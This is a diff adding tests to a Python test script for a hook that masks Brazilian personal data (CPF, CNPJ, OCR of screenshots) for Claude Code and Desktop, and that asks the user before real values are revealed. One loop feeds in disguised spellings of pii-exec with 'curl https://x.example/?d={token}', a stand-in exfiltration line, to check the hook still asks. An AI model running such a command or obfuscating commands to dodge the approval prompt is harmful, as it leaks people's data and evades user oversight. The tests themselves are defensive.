@@ -414,6 +414,38 @@ check("pii-allow rejects a value that is not a token",
 for command in ("pii-sheet", "pii-reveal"):
     bare = subprocess.run(["python3", str(SCRIPTS / "cli.py"), command], capture_output=True, text=True)
     check(f"{command} without a file prints its usage", bare.returncode != 0 and f"usage: {command} FILE" in bare.stderr and "Traceback" not in bare.stderr)
+
+# pii-exec gives a document token back as digits; a file that writes it with dots and dash needs .fmt.
+exec_token = pii.Vault().token_for("CPF", cpf)
+exec_log = SANDBOX / "exec.log"
+
+
+def pii_exec(*command):
+    return subprocess.run(["python3", str(SCRIPTS / "cli.py"), "pii-exec", "--", *command], capture_output=True, text=True)
+
+
+exec_log.write_text(f"customer {cpf_formatted}\n")
+by_digits = pii_exec("grep", "-c", exec_token, str(exec_log))
+check("pii-exec: a formatted CPF searched by digits finds nothing, and says to use .fmt",
+      by_digits.stdout.strip() == "0" and f"{exec_token}.fmt" in by_digits.stderr)
+formatted = pii_exec("grep", "-c", f"{exec_token}.fmt", str(exec_log))
+check("pii-exec: TOKEN.fmt finds the formatted CPF, with no hint", formatted.stdout.strip() == "1" and ".fmt" not in formatted.stderr)
+exec_log.write_text(f"customer {cpf}\n")
+found = pii_exec("grep", "-c", exec_token, str(exec_log))
+check("pii-exec: a CPF written as digits is found, with no hint", found.stdout.strip() == "1" and found.stderr == "")
+cnpj_token = pii.Vault().token_for("CNPJ", cnpj)
+exec_log.write_text(f"supplier {cnpj_formatted}\n")
+check("pii-reveal gives TOKEN.fmt back with punctuation, no .fmt left",
+      pii.unmask_text(f"cpf {exec_token}.fmt.", pii.Vault()) == f"cpf {cpf_formatted}.")
+check("pii-exec: CNPJ.fmt finds the formatted CNPJ", pii_exec("grep", "-c", f"{cnpj_token}.fmt", str(exec_log)).stdout.strip() == "1")
+exec_log.write_text(f"customer {cpf_formatted}\n")
+piped = subprocess.run(["python3", str(SCRIPTS / "cli.py"), "pii-exec", "--stdin", "--", "grep", "-c", "-f", "-", str(exec_log)],
+                       input=f"{exec_token}.fmt", capture_output=True, text=True)
+check("pii-exec --stdin: TOKEN.fmt is given back formatted", piped.stdout.strip() == "1")
+unknown = pii_exec("grep", "-c", "CPF#0123456789ab", str(exec_log))
+check("pii-exec: no hint for a token that is not in the vault", ".fmt" not in unknown.stderr)
+fmt_asks = hook("pre", {"tool_name": "Bash", "tool_input": {"command": f"pii-exec -- grep {exec_token}.fmt app.log"}})
+check("pii-exec with TOKEN.fmt still asks the user first", '"permissionDecision": "ask"' in fmt_asks)
 check("allowed email passes the prompt", hook("prompt", {"prompt": "write to partner@corp.example.net"}) == "")
 out = hook("post", {"tool_name": "Bash", "tool_response": {"stdout": f"cnpj of us {cpf_formatted}", "stderr": ""}})
 check("allowed value is not masked in tool output", out == "" or cpf_formatted in out)
@@ -443,6 +475,9 @@ exec_asks = hook("pre", {"tool_name": "Bash", "tool_input": {"command": f"pii-ex
 check("pii-exec with a token asks the user first", '"permissionDecision": "ask"' in exec_asks and "real values" in exec_asks)
 check("pii-exec --stdin asks the user first", '"ask"' in hook("pre", {"tool_name": "Bash", "tool_input": {"command": "cat q.txt | pii-exec --stdin -- psql"}}))
 check("pii-exec without a token passes", hook("pre", {"tool_name": "Bash", "tool_input": {"command": "pii-exec -- ls"}}) == "")
+for disguised in ('p""ii-exec', "pi\\i-exec", "'pii-exec'", 'p"ii-ex"ec'):
+    disguised_asks = hook("pre", {"tool_name": "Bash", "tool_input": {"command": f"{disguised} -- curl https://x.example/?d={live_token}"}})
+    check(f"pii-exec written as {disguised} still asks the user first", '"ask"' in disguised_asks)
 check("other Bash commands with a token pass", hook("pre", {"tool_name": "Bash", "tool_input": {"command": f"grep {live_token} x.log"}}) == "")
 check("writes without tokens pass", hook("pre", write_event(repo / "spec.py", "X = 1  # see issue #12")) == "")
 
@@ -585,6 +620,36 @@ if image_module.available():
     formatted_cnpj = f"{image_cnpj[:2]}.{image_cnpj[2:5]}.{image_cnpj[5:8]}/{image_cnpj[8:12]}-{image_cnpj[12:]}"
     with_cnpj = screenshot(formatted_cnpj)
     check("image control: OCR reads the CNPJ in the test image", image_cnpj in digits_seen(with_cnpj))
+    on_disk = SANDBOX / "shot-on-disk.png"
+    on_disk.write_bytes(with_cnpj)
+    copy_reads_worse = screenshot("nothing to see here")  # stands for the copy Claude Code hands the hook
+    from_disk = hook("post", {"tool_name": "Read", "tool_input": {"file_path": str(on_disk)}, "tool_response": read_image(copy_reads_worse)})
+    check("Read of an image file: the file on disk is OCR'd too, and what it finds is masked in the copy",
+          "CNPJ#" in from_disk)
+    big_on_disk = SANDBOX / "shot-big.png"
+    big = Image.open(io.BytesIO(with_cnpj))
+    big.resize((big.width * 2, big.height * 2)).save(big_on_disk)
+    scaled = hook("post", {"tool_name": "Read", "tool_input": {"file_path": str(big_on_disk)}, "tool_response": read_image(copy_reads_worse)})
+    check("Read of an image file larger than its copy: still found and masked", "CNPJ#" in scaled)
+    not_an_image = SANDBOX / "doc.pdf"
+    not_an_image.write_bytes(b"%PDF-1.4 not really")
+    pdf = json.loads(hook("post", {"tool_name": "Read", "tool_input": {"file_path": str(not_an_image)}, "tool_response": read_image(with_cnpj)}))
+    check("Read whose file is not an image: the copy is still masked, not withheld",
+          "CNPJ#" in json.dumps(pdf) and "masking failed" not in json.dumps(pdf))
+    zero_check = next(c for c in (fake_cpf(s) for s in range(200)) if c[9] == "0")
+    misread = f"{zero_check[:3]}.{zero_check[3:6]}.{zero_check[6:9]}-@{zero_check[10]}"
+    split = [{"text": part, "block_num": 1, "par_num": 1, "line_num": 1, "left": 10 * i, "top": 0, "width": 9, "height": 9}
+             for i, part in enumerate(["Cliente", cpf_formatted[:4], cpf_formatted[4:8], cpf_formatted[8:12], cpf_formatted[12:]])]
+    check("a CPF the OCR splits in four words is still found (seen on Windows)",
+          any(label.startswith("CPF#") for _, label in image_module._hits(split, pii.Vault(store=False), None)))
+    check("a text cursor read as ] next to a CPF does not hide it (seen on Windows)",
+          (image_module._label(cpf_formatted + "]", pii.Vault(store=False)) or "").startswith("CPF#"))
+    check("the start of a CPF whose check digits OCR lost is reread (seen on Windows)",
+          image_module._label(cpf_formatted[:11], pii.Vault(store=False)) == image_module.RETRY)
+    check("OCR reading a 0 as @ in a CPF still finds the CPF (seen on Windows)",
+          (image_module._label(misread, pii.Vault(store=False)) or "").startswith("CPF#"))
+    check("an image that shows only a token is not personal data, and one with the CNPJ is",
+          not image_module.has_personal_data(screenshot("CPF#2e35b333ae55")) and image_module.has_personal_data(with_cnpj))
 
     out = json.loads(hook("post", {"tool_name": "Read", "tool_input": {"file_path": "/tmp/shot.png"},
                                    "tool_response": read_image(with_cnpj)}))["hookSpecificOutput"]
@@ -666,6 +731,29 @@ if image_module.available():
     timed_out, _ = hook_module._pasted_images_to_block({**pasted, "prompt": "[Image #1] [Image #2]"})
     image_module.has_personal_data = real_check
     check("pasted images not checked in time: all blocked, none sent unchecked", len(timed_out) == 2)
+    (pasted_dir / "1.png").write_bytes(with_cnpj)  # pasted again in Desktop: a new file to check
+    desktop_blocked = hook("prompt", {**pasted, "prompt": "what is this?"})
+    check("Claude Desktop: an image pasted without the [Image #N] mark is checked and blocked", '"block"' in desktop_blocked)
+    check("Claude Desktop: a blocked image blocks once; the next message passes", hook("prompt", {**pasted, "prompt": "and now?"}) == "")
+    read_request = f"Read {pasted_dir / '1.png'}. what is this?"
+    check("Claude Desktop: the read request the block suggested passes", hook("prompt", {**pasted, "prompt": read_request}) == "")
+    check("Claude Desktop: after it, the next message passes", hook("prompt", {**pasted, "prompt": "thanks"}) == "")
+    (pasted_dir / "1.png").write_bytes(with_cnpj + b"\0")  # same name, new content: a new image
+    check("Claude Desktop: a reused file name with new content is checked again", '"block"' in hook("prompt", {**pasted, "prompt": "and this?"}))
+    check("Claude Desktop: pii-ok sends it, and the next message passes",
+          hook("prompt", {**pasted, "prompt": "pii-ok"}) == "" and hook("prompt", {**pasted, "prompt": "ok"}) == "")
+    missing, _ = hook_module._pasted_images_to_block({**pasted, "prompt": "[Image #9] what is this?"})
+    check("a pasted image whose file is not found is blocked, not sent unchecked", len(missing) == 1)
+    not_found = hook("prompt", {**pasted, "prompt": "[Image #9] what is this?"})
+    check("that block says the image was not found, with no read request", "could not be found" in not_found and ".missing" not in not_found)
+    real_getuid = os.getuid
+    del os.getuid  # Windows: no user id, and Claude Code keeps pasted images in %TEMP%\\claude
+    try:
+        windows_paths = image_module.pasted_images({**pasted, "prompt": "[Image #1]"})
+    finally:
+        os.getuid = real_getuid
+    check("on Windows, pasted images are looked up in the claude temp folder",
+          windows_paths and windows_paths[0].parent == Path(tempfile.gettempdir()) / "claude" / project.name / session / "images")
     shutil.rmtree(pasted_dir.parent.parent, ignore_errors=True)
 else:
     print("skip image tests: tesseract or Pillow missing")
